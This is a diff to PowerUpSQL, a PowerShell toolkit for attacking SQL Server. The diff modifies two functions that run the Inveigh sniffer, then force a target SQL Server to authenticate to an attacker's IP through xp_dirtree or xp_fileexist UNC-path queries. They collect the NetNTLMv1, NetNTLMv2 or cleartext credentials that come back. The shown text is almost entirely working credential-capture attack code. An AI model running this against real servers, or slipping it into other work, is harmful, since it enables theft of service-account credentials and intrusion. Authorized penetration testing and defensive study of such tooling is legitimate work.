@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.54
+        Version: 1.0.0.55
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -12436,34 +12436,39 @@ Function Invoke-SQLAuditPrivXpDirtree
                                 Write-Verbose -Message "$Instance : - Start sniffing..."
                                 $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp
 
+                                # Randomized 5 character file name
+                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
 
                                 # Sent unc path to attacker's Ip
-                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
-                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 10 -SuppressVerbose
+                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose
 
+								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
+								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
+                                Start-Sleep -s $TimeOut
+                                
                                 # Stop sniffing and print password hashes
-                                Start-Sleep $TimeOut
                                 $null = Stop-Inveigh
                                 Write-Verbose -Message "$Instance : - Stopped sniffing."
 
                                 $HashType = ''
                                 $Hash = ''
 
-                                [string]$PassCleartext = Get-InveighCleartext
+                                [string]$PassCleartext = Get-Inveigh -Cleartext Y
                                 if($PassCleartext)
                                 {
                                     $HashType = 'Cleartext'
                                     $Hash = $PassCleartext
                                 }
 
-                                [string]$PassNetNTLMv1 = Get-InveighNTLMv1
+                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1 Y
                                 if($PassNetNTLMv1)
                                 {
                                     $HashType = 'NetNTLMv1'
                                     $Hash = $PassNetNTLMv1
                                 }
 
-                                [string]$PassNetNTLMv2 = Get-InveighNTLMv2
+                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2 Y
                                 if($PassNetNTLMv2)
                                 {
                                     $HashType = 'NetNTLMv2'
@@ -12771,33 +12776,39 @@ Function Invoke-SQLAuditPrivXpFileexist
                                 Write-Verbose -Message "$Instance : - Start sniffing..."
                                 $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp
 
+                                # Randomized 5 character file name
+                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
+
                                 # Sent unc path to attacker's Ip
-                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
-                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\file'" -TimeOut 10 -SuppressVerbose
+                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose
+
+								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
+								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
+                                Start-Sleep -s $TimeOut
 
                                 # Stop sniffing and print password hashes
-                                Start-Sleep $TimeOut
                                 $null = Stop-Inveigh
                                 Write-Verbose -Message "$Instance : - Stopped sniffing."
 
                                 $HashType = ''
                                 $Hash = ''
 
-                                [string]$PassCleartext = Get-InveighCleartext
+                                [string]$PassCleartext = Get-Inveigh -Cleartext Y
                                 if($PassCleartext)
                                 {
                                     $HashType = 'Cleartext'
                                     $Hash = $PassCleartext
                                 }
 
-                                [string]$PassNetNTLMv1 = Get-InveighNTLMv1
+                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1 Y
                                 if($PassNetNTLMv1)
                                 {
                                     $HashType = 'NetNTLMv1'
                                     $Hash = $PassNetNTLMv1
                                 }
 
-                                [string]$PassNetNTLMv2 = Get-InveighNTLMv2
+                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2 Y
                                 if($PassNetNTLMv2)
                                 {
                                     $HashType = 'NetNTLMv2'
